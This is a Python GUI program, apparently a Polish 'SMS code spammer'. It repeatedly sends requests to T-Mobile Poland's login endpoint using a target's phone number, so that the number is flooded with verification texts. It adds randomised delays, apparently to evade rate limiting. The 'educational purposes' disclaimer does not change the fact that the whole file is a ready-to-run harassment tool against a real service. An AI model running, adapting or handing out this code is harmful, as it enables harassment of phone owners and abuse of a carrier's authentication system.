from tkinter import *
from tkinter import ttk
from tkinter import messagebox
import requests
import random
import time
import threading


messagebox.showinfo("Uwaga", "Nie odpowiadam za żadne użycie tego narzędzia, zostało ono zrobione w celach edukacyjnych.")


endpoint="https://idm.t-mobile.pl/openid/auth?redirect_uri=https://nowymoj.t-mobile.pl&scope=openid%20profile&client_id=new_selfcare&response_type=code&state=/&login_hint=4"

root = Tk()
root.geometry("400x380")
#root.resizable(False,False)
root.title("GnujKodSpammer V1.0")
style = ttk.Style()

style.layout("Custom.TButtonGreen", style.layout("TButton"))
style.layout("Custom.TButtonRed", style.layout("TButton"))

style.configure(
    "Custom.TButtonRed",
    background="#d45353",
    foreground="black"
)

style.map(
    "Custom.TButtonRed",
    background=[
        ("disabled", "#b8b8b8"),
        ("active", "#b94040")
    ],
    foreground=[
        ("disabled", "#666666")
    ]
)

style.configure(
    "Custom.TButtonGreen",
    background="#43d87c",
    foreground="black"
)

style.map(
    "Custom.TButtonGreen",
    background=[
        ("disabled", "#b8b8b8"),
        ("active", "#2eb866")
    ],
    foreground=[
        ("disabled", "#666666")
    ]
)

addRandSpread=BooleanVar(root,True)
phoneNumber=StringVar(root)
speedInp=IntVar(root)
speedRangeA=IntVar(root)
speedRangeB=IntVar(root)
spamming=False

stop_event = threading.Event()

def spamLoop():
    url = endpoint+phoneNumber.get()
    while not stop_event.is_set():
        delay=speedInp.get()
        if(addRandSpread.get()):
            delay=speedInp.get()+random.randint(speedRangeA.get(),speedRangeB.get())
        try:
            resp=requests.get(url,timeout=1)
        except requests.RequestException:
            pass

        time.sleep(delay)

def startSpamming():
    startSpammingBtn.config(state="disabled")
    stopSpammingBtn.config(state="normal")

    thread = threading.Thread(target=spamLoop,daemon=True)
    thread.start()

def stopSpamming():
    stopSpammingBtn.config(state="disabled")
    startSpammingBtn.config(state="normal")
    stop_event.set()


frm = ttk.Frame(root, padding=10)
frm.pack()

ttk.Label(frm, text="GnujKodSpammer V1.0",font=("Kartika",16)).pack()

ttk.Label(frm, text="numer telefonu:",font=("Latha",13)).pack(pady=(15,0))
ttk.Entry(frm,textvariable=phoneNumber,width=50,justify="center").pack(ipady=5)

ttk.Label(frm, text="odstęp między wysłaniem kodów (ms):",font=("Latha",13)).pack(pady=(15,0))
ttk.Spinbox(frm,textvariable=speedInp,from_=0, to=999999999).pack()

ttk.Label(frm, text="dodaj losowy delay:",font=("Latha",13)).pack(pady=(15,0))
ttk.Checkbutton(frm,variable=addRandSpread).pack()

randDelayFrm=ttk.Labelframe(frm,text="zakres losowego delay-u:",relief="ridge")
randDelayFrm.pack(anchor="n",expand=True)
ttk.Spinbox(randDelayFrm,textvariable=speedRangeA,from_=0, to=999999999).pack(side="left")
ttk.Spinbox(randDelayFrm,textvariable=speedRangeB,from_=0, to=999999999).pack(side="left")

buttonsFrm=ttk.Frame(frm)
buttonsFrm.pack(anchor="n",expand=True,pady=(15,0))

startSpammingBtn=ttk.Button(buttonsFrm,text="Start",state="normal",command=startSpamming,width=12,style="Custom.TButtonGreen")
startSpammingBtn.pack(side="left",padx=10,ipady=5)
stopSpammingBtn=ttk.Button(buttonsFrm,text="Stop",state="disabled",command=stopSpamming,width=12,style="Custom.TButtonRed")
stopSpammingBtn.pack(side="right",ipady=5)

footerFrm=ttk.Frame(root)
footerFrm.pack(fill="x",anchor="w")
ttk.Button(footerFrm, text="Wyjdź", command=root.destroy).pack(side="right", padx=2)
ttk.Label(footerFrm, text="Autor: @Pozdro70").pack(side="left",padx=2)
root.mainloop()
